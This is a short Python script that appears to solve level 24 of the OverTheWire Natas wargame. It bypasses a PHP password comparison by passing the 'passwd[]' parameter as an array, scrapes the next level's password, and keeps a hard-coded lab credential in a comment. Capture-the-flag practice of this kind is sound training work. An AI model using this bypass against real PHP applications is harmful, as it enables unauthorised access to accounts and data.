import requests
import re
from requests.auth import HTTPBasicAuth
def solve24(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyNDpPc1JtWEZndW96S3BUWlo1WDE0ek5PNDMzNzlMWnZlZw=="
    url = "http://natas24.natas.labs.overthewire.org/?passwd[]=0"
    resp = session.get(url)
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw

